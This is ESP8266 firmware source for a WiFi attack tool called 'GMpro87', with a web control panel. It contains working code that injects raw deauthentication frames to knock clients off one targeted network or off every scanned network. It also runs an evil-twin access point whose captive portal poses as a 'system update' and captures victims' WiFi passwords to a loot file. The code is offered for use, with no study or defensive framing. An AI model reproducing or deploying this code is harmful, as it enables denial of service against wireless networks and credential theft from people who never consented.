#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

extern "C" {
#include "user_interface.h"
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

/* ===========================================
   KONFIGURASI & VARIABEL SISTEM
   =========================================== */
const char AP_SSID_DEFAULT[] = "GMpro87";
const char AP_PASS_DEFAULT[] = "9u5M4n9_88";

bool massDeauthActive = false;
bool targetDeauthActive = false;
bool beaconSpamActive = false;
bool evilTwinActive = false;

struct Network {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  String bssidStr;
};

Network networks[30]; // Kapasitas scan 30 network
int networkCount = 0;
Network selectedNet;

ESP8266WebServer server(80);
DNSServer dnsServer;
String logs = "System Ready. Welcome GMpro87...<br>";
unsigned long lastActionTime = 0;

/* ===========================================
   FRONTEND (HTML CSS ASLI TANPA PERUBAHAN)
   =========================================== */
const char INDEX_HTML[] PROGMEM = R"=====(
<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>
<style>
:root{--c:#00f2ff;--r:#ff3e3e;--g:#00ff9d;--bg:#050505;--card:#111;}
*{margin:0;padding:0;box-sizing:border-box;font-family:monospace;}
body{background:var(--bg);color:#eee;padding:10px;}
.header{text-align:center;margin-bottom:15px;border-bottom:1px solid #222;padding-bottom:10px;}
.header h1{color:var(--c);font-size:1.3rem;letter-spacing:2px;}
.header p{font-size:0.7rem;color:#666;}
.tabs{display:flex;gap:5px;margin-bottom:15px;}
.tab-btn{flex:1;padding:10px;background:#1a1a1a;border:1px solid #333;color:#888;cursor:pointer;font-size:0.7rem;}
.tab-btn.active{border-bottom:2px solid var(--c);color:var(--c);background:#222;}
.content{display:none;} .content.active{display:block;}
.card{background:var(--card);border:1px solid #222;padding:12px;border-radius:8px;margin-bottom:10px;}
h3{color:var(--c);font-size:0.7rem;margin-bottom:8px;text-transform:uppercase;border-left:3px solid var(--c);padding-left:8px;}
.btn{width:100%;padding:12px;margin:4px 0;background:#1a1a1a;border:1px solid #444;color:#fff;font-weight:bold;cursor:pointer;border-radius:4px;font-size:0.8rem;transition:0.3s;}
.btn.active{background:var(--c);color:#000;box-shadow:0 0 15px var(--c);border-color:var(--c);}
.log-box{background:#000;height:120px;overflow-y:auto;padding:8px;font-size:10px;color:var(--g);border:1px solid #222;}
table{width:100%;font-size:10px;border-collapse:collapse;} 
th{color:#666;text-align:left;padding:5px;border-bottom:1px solid #333;}
td{padding:8px 5px;border-bottom:1px solid #1a1a1a;}
.sel-btn{background:var(--c);color:#000;border:none;padding:3px 6px;border-radius:2px;font-weight:bold;}
input, select{width:100%;padding:10px;background:#1a1a1a;color:#fff;border:1px solid #444;margin:5px 0;font-family:monospace;}
</style></head><body>
<div class='header'><h1>GMpro87</h1><p>(by : 9u5M4n9)</p></div>
<div class='tabs'>
<button class='tab-btn active' onclick="opTab(event,'atk')">ATTACK</button>
<button class='tab-btn' onclick="opTab(event,'fil')">FILES</button>
<button class='tab-btn' onclick="opTab(event,'set')">SET</button>
</div>
<div id='atk' class='content active'>
<div class='card'><h3>Log Dashboard</h3><div class='log-box' id='logs'>Ready...</div></div>
<div class='card'><h3>Attack Engine</h3>
<button id='kill' class='btn' onclick="tg('kill')">MASS DEAUTH</button>
<button id='deauth' class='btn' onclick="tg('deauth')">TARGET DEAUTH</button>
<button id='spam' class='btn' onclick="tg('spam')">BEACON SPAM</button>
<button id='evil' class='btn' onclick="tg('evil')">EVIL TWIN</button></div>
<div class='card'><h3>WiFi Scanner</h3><button class='btn' onclick='scan()'>SCAN</button>
<table><thead><tr><th>SSID</th><th>CH</th><th>SIG</th><th>ACT</th></tr></thead><tbody id='list'></tbody></table></div>
</div>
<div id='fil' class='content'>
<div class='card'><h3>Upload Page</h3><input type='file' id='f' multiple><button class='btn' onclick='up()'>UPLOAD FILES</button></div>
<div class='card'><h3>Captured Loot</h3><div class='log-box' id='loot' style='color:#ffc107'></div><button class='btn' onclick='ldLoot()'>REFRESH LOOT</button></div>
</div>
<div id='set' class='content'>
<div class='card'><h3>Beacon Spam Config</h3><input type='number' id='bN' placeholder='Jumlah Clone'><button class='btn' onclick='stSpam()'>SET AMOUNT</button></div>
<div class='card'><h3>Evil Twin Selector</h3><select id='etS'><option value='/etwin1.html'>etwin1.html</option><option value='/etwin2.html'>etwin2.html</option><option value='/etwin3.html'>etwin3.html</option><option value='/etwin4.html'>etwin4.html</option><option value='/etwin5.html'>etwin5.html</option></select><button class='btn' onclick='setEt()'>SET ACTIVE PAGE</button></div>
<div class='card'><h3>AP Settings</h3><input type='text' id='aS' placeholder='SSID'><input type='text' id='aP' placeholder='PASS'><button class='btn' onclick='save()'>SAVE & REBOOT</button></div>
</div>
<script>
function opTab(e,n){var i,c,t;c=document.getElementsByClassName('content');for(i=0;i<c.length;i++)c[i].style.display='none';
t=document.getElementsByClassName('tab-btn');for(i=0;i<t.length;i++)t[i].className=t[i].className.replace(' active','');
document.getElementById(n).style.display='block';e.currentTarget.className+=' active';}
function scan(){fetch('/scan').then(r=>r.json()).then(data=>{let h='';data.forEach(n=>{h+='<tr><td>'+(n.s||'[HIDDEN]')+'</td><td>'+n.c+'</td><td>'+n.r+'%</td><td><button class="sel-btn" onclick="sel(\''+n.b+'\',\''+n.s+'\','+n.c+')">SEL</button></td></tr>';});document.getElementById('list').innerHTML=h;});}
function sel(b,s,c){fetch('/select?b='+b+'&s='+s+'&c='+c).then(()=>alert('Target Locked: '+s));}
function tg(m){fetch('/toggle?m='+m).then(r=>r.text()).then(st=>{let b=document.getElementById(m);if(st.trim()=="ON")b.classList.add('active');else b.classList.remove('active');});}
function up(){var files=document.getElementById('f').files;for(var i=0;i<files.length;i++){var d=new FormData();d.append('file',files[i],"/"+files[i].name);fetch('/upload',{method:'POST',body:d});}alert('Upload Done!');}
function ldLoot(){fetch('/pass.txt').then(r=>r.text()).then(t=>document.getElementById('loot').innerText=t);}
function chk(){fetch('/status').then(r=>r.json()).then(s=>{if(s.k)document.getElementById('kill').classList.add('active');if(s.d)document.getElementById('deauth').classList.add('active');if(s.s)document.getElementById('spam').classList.add('active');if(s.e)document.getElementById('evil').classList.add('active');});}
window.onload=chk;
setInterval(function(){fetch('/getlogs').then(r=>r.text()).then(t=>{if(t.length>2){var l=document.getElementById('logs');l.innerHTML+=t;l.scrollTop=l.scrollHeight;}});},1500);
</script></body></html>
)=====";

/* ===========================================
   LOGIKA INJEKSI PAKET (RAW)
   =========================================== */

void sendDeauthPacket(uint8_t* bssid) {
  uint8_t packet[26] = {
    0xC0, 0x00, 0x3A, 0x01, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Target BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00, 0x01, 0x00              // Reason code
  };
  memcpy(&packet[10], bssid, 6);
  memcpy(&packet[16], bssid, 6);
  wifi_send_pkt_freedom(packet, 26, 0);
}

void parseMac(String macStr, uint8_t* macBytes) {
  for (int i = 0; i < 6; i++) {
    macBytes[i] = strtoul(macStr.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
}

/* ===========================================
   SERVER HANDLERS
   =========================================== */

void handleToggle() {
  String mode = server.arg("m");
  String state = "OFF";

  if (mode == "kill") {
    massDeauthActive = !massDeauthActive;
    if (massDeauthActive) { state = "ON"; logs += "[!!!] MASS DEAUTH ACTIVE<br>"; }
    else { logs += "[*] MASS DEAUTH STOPPED<br>"; }
  }
  else if (mode == "deauth") {
    if (selectedNet.ssid == "") { logs += "Error: No target locked!<br>"; }
    else {
      targetDeauthActive = !targetDeauthActive;
      if (targetDeauthActive) { state = "ON"; logs += "[!] DEAUTH: " + selectedNet.ssid + "<br>"; }
      else { logs += "[*] TARGET DEAUTH STOPPED<br>"; }
    }
  }
  else if (mode == "spam") {
    beaconSpamActive = !beaconSpamActive;
    state = beaconSpamActive ? "ON" : "OFF";
    logs += beaconSpamActive ? "[!] BEACON SPAM START<br>" : "[*] SPAM STOPPED<br>";
  }
  else if (mode == "evil") {
    evilTwinActive = !evilTwinActive;
    if (evilTwinActive && selectedNet.ssid != "") {
      state = "ON";
      WiFi.softAP(selectedNet.ssid.c_str(), "");
      logs += "[!] EVIL TWIN: " + selectedNet.ssid + "<br>";
    } else {
      WiFi.softAP(AP_SSID_DEFAULT, AP_PASS_DEFAULT);
      evilTwinActive = false;
      logs += "[*] EVIL TWIN STOPPED<br>";
    }
  }
  server.send(200, "text/plain", state);
}

void setup() {
  Serial.begin(115200);
  LittleFS.begin();
  
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAP(AP_SSID_DEFAULT, AP_PASS_DEFAULT);
  
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", []() { server.send(200, "text/html", INDEX_HTML); });
  
  server.on("/scan", []() {
    int n = WiFi.scanNetworks();
    networkCount = n;
    String json = "[";
    for (int i = 0; i < n; i++) {
      networks[i].ssid = WiFi.SSID(i);
      networks[i].ch = WiFi.channel(i);
      networks[i].bssidStr = WiFi.BSSIDstr(i);
      parseMac(networks[i].bssidStr, networks[i].bssid);

      json += "{\"s\":\""+networks[i].ssid+"\",\"c\":"+String(networks[i].ch)+",\"r\":"+String(WiFi.RSSI(i)+100)+",\"b\":\""+networks[i].bssidStr+"\"}";
      if (i < n - 1) json += ",";
    }
    json += "]";
    server.send(200, "application/json", json);
    logs += "[*] Scan complete: " + String(n) + " found<br>";
  });

  server.on("/select", []() {
    selectedNet.ssid = server.arg("s");
    selectedNet.ch = server.arg("c").toInt();
    selectedNet.bssidStr = server.arg("b");
    parseMac(selectedNet.bssidStr, selectedNet.bssid);
    server.send(200, "text/plain", "OK");
  });

  server.on("/toggle", handleToggle);
  server.on("/getlogs", []() { server.send(200, "text/plain", logs); logs = ""; });
  
  server.on("/status", []() {
    String json = "{\"k\":" + String(massDeauthActive) + ",\"d\":" + String(targetDeauthActive) + ",\"s\":" + String(beaconSpamActive) + ",\"e\":" + String(evilTwinActive) + "}";
    server.send(200, "application/json", json);
  });

  server.on("/pass.txt", []() {
    File f = LittleFS.open("/pass.txt", "r");
    if (f) { server.streamFile(f, "text/plain"); f.close(); }
    else server.send(200, "text/plain", "Empty...");
  });

  server.on("/upload", HTTP_POST, [](){ server.send(200); }, [](){
    HTTPUpload& upload = server.upload();
    if(upload.status == UPLOAD_FILE_START){
      File f = LittleFS.open(upload.filename, "w"); f.close();
    } else if(upload.status == UPLOAD_FILE_WRITE){
      File f = LittleFS.open(upload.filename, "a"); f.write(upload.buf, upload.currentSize); f.close();
    }
  });

  // Captive Portal Login Capture
  server.onNotFound([]() {
    String html = "<html><body style='background:#000;color:#00f2ff;font-family:monospace;padding:20px;text-align:center;'>";
    html += "<h2>SYSTEM UPDATE</h2><p>Please re-enter WiFi Password to continue</p>";
    html += "<form action='/login'><input name='pw' type='password' style='padding:10px;width:100%'><br><br>";
    html += "<input type='submit' value='CONNECT' style='background:#00f2ff;padding:10px;width:100%'></form></body></html>";
    server.send(200, "text/html", html);
  });

  server.on("/login", []() {
    String pw = server.arg("pw");
    File f = LittleFS.open("/pass.txt", "a");
    f.println("Target: " + selectedNet.ssid + " | Pass: " + pw);
    f.close();
    logs += "<span style='color:var(--r)'>[!] PASSWORD CAPTURED: " + pw + "</span><br>";
    server.send(200, "text/html", "Updating system... Please wait.");
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  unsigned long now = millis();

  // Logic Target Deauth
  if (targetDeauthActive && (now - lastActionTime > 100)) {
    wifi_set_channel(selectedNet.ch);
    sendDeauthPacket(selectedNet.bssid);
    lastActionTime = now;
  }

  // Logic Mass Deauth (Attack all scanned networks)
  if (massDeauthActive && (now - lastActionTime > 150)) {
    static int currentAtk = 0;
    if (networkCount > 0) {
      wifi_set_channel(networks[currentAtk].ch);
      sendDeauthPacket(networks[currentAtk].bssid);
      currentAtk = (currentAtk + 1) % networkCount;
    }
    lastActionTime = now;
  }
}
